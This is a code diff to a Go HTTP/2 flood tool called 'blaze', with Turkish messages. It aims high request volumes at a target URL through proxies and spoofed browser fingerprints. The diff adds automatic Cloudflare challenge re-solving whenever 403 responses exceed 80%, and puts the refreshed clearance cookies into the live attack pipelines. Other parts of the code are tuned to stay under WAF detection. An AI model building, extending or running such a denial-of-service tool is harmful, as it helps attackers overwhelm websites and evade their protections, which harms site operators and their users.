@@ -28,7 +28,7 @@ func main() {
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
 		fmt.Println()
 		fmt.Println("flaglar:")
-		fmt.Println("  --solve    cloudflare challenge coz (puppeteer-real-browser gerektirir)")
+		fmt.Println("  --solve    cloudflare challenge coz + auto-refresh (puppeteer-real-browser)")
 		fmt.Println("             ilk kullanim: cd solver && npm install")
 		fmt.Println()
 		fmt.Println("proxy dosya formati (satir satir):")
@@ -52,7 +52,6 @@ func main() {
 	proxyArg := ""
 	solve := false
 
-	// Parse remaining args - positional + flags
 	posArgs := []string{}
 	for _, arg := range os.Args[4:] {
 		if arg == "--solve" {
@@ -71,7 +70,6 @@ func main() {
 		proxyArg = posArgs[2]
 	}
 
-	// Solve Cloudflare challenge if --solve flag is set
 	var solvedCookies string
 	var solvedUA string
 	if solve {
@@ -83,7 +81,7 @@ func main() {
 		}
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA)
+	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
 }
 
 // solverResult is the JSON output from solver/index.js
@@ -99,24 +97,11 @@ type solverResult struct {
 func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
 	fmt.Println("cloudflare challenge cozuluyor...")
 
-	// Find solver script relative to executable or cwd
-	solverPaths := []string{
-		"solver/index.js",
-		"./solver/index.js",
-	}
-
-	var solverPath string
-	for _, p := range solverPaths {
-		if _, err := os.Stat(p); err == nil {
-			solverPath = p
-			break
-		}
-	}
+	solverPath := findSolver()
 	if solverPath == "" {
 		return "", "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
 	}
 
-	// Check if node_modules exists
 	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
 		return "", "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
 	}
@@ -155,11 +140,39 @@ func solveCFChallenge(targetURL string) (cookies string, userAgent string, err e
 	return result.Cookies, result.UserAgent, nil
 }
 
-// clientGroup holds multiple clients of the same browser type for connection multiplying.
+func findSolver() string {
+	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+	return ""
+}
+
+// cookieStore holds the current cookie string, updated atomically during refresh.
+type cookieStore struct {
+	mu      sync.RWMutex
+	cookies string
+}
+
+func (cs *cookieStore) Get() string {
+	cs.mu.RLock()
+	defer cs.mu.RUnlock()
+	return cs.cookies
+}
+
+func (cs *cookieStore) Set(c string) {
+	cs.mu.Lock()
+	cs.cookies = c
+	cs.mu.Unlock()
+}
+
+// clientGroup holds multiple clients of the same browser type.
 type clientGroup struct {
 	name      string
 	clients   []*gofire.Client
 	pipelines []*gofire.Pipeline
+	templates []*http.Request
 }
 
 func (cg *clientGroup) Close() {
@@ -179,13 +192,16 @@ func (cg *clientGroup) ActiveConnections() int64 {
 	return total
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string) {
+// updateCookies updates the Cookie header on all templates.
+func (cg *clientGroup) updateCookies(newCookies string) {
+	for _, tmpl := range cg.templates {
+		tmpl.Header.Set("Cookie", newCookies)
+	}
+}
+
+func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	// Scale total connections with thread count for higher RPS.
-	// Each client = 1 HTTP/2 connection = ~256 concurrent streams.
-	// More connections = more concurrent streams = higher throughput.
-	// Cap at 40 to avoid WAF connection-count detection.
 	totalTargetClients := threads
 	if totalTargetClients > 40 {
 		totalTargetClients = 40
@@ -211,14 +227,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		gofire.WithReadBufferSize(128 * 1024),
 	}
 
-	// Per-browser referers - each browser uses a realistic search engine referer.
 	browserReferers := map[string]string{
 		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
 		"chrome":  "https://www.google.com/",
 		"firefox": "https://duckduckgo.com/",
 	}
 
-	// Detect proxy mode
 	var proxyRotator *gofire.ProxyRotator
 	if proxyArg != "" {
 		if isProxyFile(proxyArg) {
@@ -233,15 +247,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}
 
-	// Parse solved cookies into []*http.Cookie for injection
 	var parsedCookies []*http.Cookie
 	if solvedCookies != "" {
 		parsedCookies = parseCookieHeader(solvedCookies)
 		fmt.Printf("cookie: %d adet yuklendi\n", len(parsedCookies))
 	}
 
-	// Create multiple clients per browser with weighted distribution.
-	// Safari 40%, Chrome 30%, Firefox 30%
 	type browserSpec struct {
 		name    string
 		profile gofire.BrowserProfile
@@ -251,9 +262,6 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	var browsers []browserSpec
 
 	if solvedCookies != "" {
-		// When using solved cookies, ALL clients must be Chrome with solver's UA.
-		// cf_clearance is bound to User-Agent + TLS fingerprint.
-		// Solver uses Chrome, so all blaze clients must match.
 		browsers = []browserSpec{
 			{"chrome", gofire.Chrome146, totalTargetClients},
 		}
@@ -262,7 +270,6 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 		fmt.Printf("cf-bypass: tum clientlar chrome (solver UA ile)\n")
 	} else {
-		// Normal mode: 40% Safari, 30% Chrome, 30% Firefox
 		safariClients := totalTargetClients * 4 / 10
 		chromeClients := totalTargetClients * 3 / 10
 		firefoxClients := totalTargetClients - safariClients - chromeClients
@@ -295,7 +302,6 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 
 	for bi, bs := range browsers {
 		cg := &clientGroup{name: bs.name}
-
 		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))
 
 		for i := 0; i < bs.clients; i++ {
@@ -307,18 +313,14 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			if proxyRotator != nil {
 				c.SetProxyRotator(proxyRotator)
 			}
-			// Inject solved cookies into client's cookie jar
 			if len(parsedCookies) > 0 {
 				_ = c.SetCookies(targetURL, parsedCookies)
 			}
-			// Pre-build request template for FastDo path
 			tmpl, err := c.PrepareRequest(method, targetURL)
 			if err != nil {
 				fmt.Fprintf(os.Stderr, "hata: %s template olusturulamadi: %v\n", bs.name, err)
 				os.Exit(1)
 			}
-			// Inject cookie header directly into template for FastDo path
-			// (FastDo bypasses cookie jar, so we must set it on the template)
 			if solvedCookies != "" {
 				tmpl.Header.Set("Cookie", solvedCookies)
 			}
@@ -326,6 +328,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			p.SetTemplate(tmpl)
 			cg.clients = append(cg.clients, c)
 			cg.pipelines = append(cg.pipelines, p)
+			cg.templates = append(cg.templates, tmpl)
 		}
 		groups[bi] = cg
 	}
@@ -341,6 +344,9 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	if solvedCookies != "" {
 		fmt.Printf("browser: %d chrome client (cf-bypass mode, toplam %d baglanti)\n",
 			totalClients, totalClients)
+		if solveEnabled {
+			fmt.Println("auto-refresh: aktif (403 orani >%80 olunca cookie yenilenir)")
+		}
 	} else {
 		var bCounts []string
 		for _, bs := range browsers {
@@ -369,13 +375,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}
 
-	// Pre-warm all clients
+	// Pre-warm
 	fmt.Print("baglanti isitiliyor... ")
 	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
-	warmPerClient := 4
 	for _, cg := range groups {
 		for _, c := range cg.clients {
-			_ = c.PreConnect(warmCtx, targetURL, warmPerClient)
+			_ = c.PreConnect(warmCtx, targetURL, 4)
 		}
 	}
 	warmCancel()
@@ -407,6 +412,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		errCountMap  sync.Map
 	)
 
+	// 403 tracking for auto-refresh
+	var recent403 atomic.Int64
+	var recentTotal atomic.Int64
+	// refreshing flag prevents multiple concurrent refreshes
+	var refreshing atomic.Bool
+
 	startTime := time.Now()
 	fmt.Printf("basliyor... %d worker x %d client\n\n", actualWorkers, totalClients)
 
@@ -435,6 +446,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 				sc := resp.StatusCode()
 				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
 				val.(*atomic.Int64).Add(1)
+
+				// Track 403 for auto-refresh
+				recentTotal.Add(1)
+				if sc == 403 {
+					recent403.Add(1)
+				}
 			}
 		}
 	}
@@ -466,6 +483,61 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 				go feedPipeline(p)
 			}
 		}
+	}
+
+	// Auto-refresh goroutine: checks 403 rate every 5 seconds
+	if solveEnabled {
+		go func() {
+			ticker := time.NewTicker(5 * time.Second)
+			defer ticker.Stop()
+
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					total := recentTotal.Load()
+					count403 := recent403.Load()
+
+					// Reset counters for next window
+					recentTotal.Store(0)
+					recent403.Store(0)
+
+					// Need at least 50 responses to judge
+					if total < 50 {
+						continue
+					}
+
+					rate := float64(count403) / float64(total)
+					if rate < 0.80 {
+						continue
+					}
+
+					// 403 rate > 80% → cookie expired, refresh
+					if !refreshing.CompareAndSwap(false, true) {
+						continue // another refresh already in progress
+					}
+
+					fmt.Printf("\n[auto-refresh] 403 orani: %.0f%% (%d/%d) - cookie yenileniyor...\n",
+						rate*100, count403, total)
+
+					newCookies, _, errSolve := solveCFChallenge(targetURL)
+					if errSolve != nil {
+						fmt.Printf("[auto-refresh] BASARISIZ: %v\n", errSolve)
+						refreshing.Store(false)
+						continue
+					}
+
+					// Update cookies on all templates (live, no restart needed)
+					for _, cg := range groups {
+						cg.updateCookies(newCookies)
+					}
+
+					fmt.Printf("[auto-refresh] cookie yenilendi! devam ediliyor...\n")
+					refreshing.Store(false)
+				}
+			}
+		}()
 	}
 
 	// Stats printer
@@ -565,7 +637,6 @@ func parseCookieHeader(raw string) []*http.Cookie {
 	return req.Cookies()
 }
 
-// isProxyFile checks if the argument is a file path (vs a proxy URL).
 func isProxyFile(s string) bool {
 	if strings.Contains(s, "://") {
 		return false
@@ -587,4 +658,3 @@ func mustInt(s, name string) int {
 	}
 	return v
 }
-
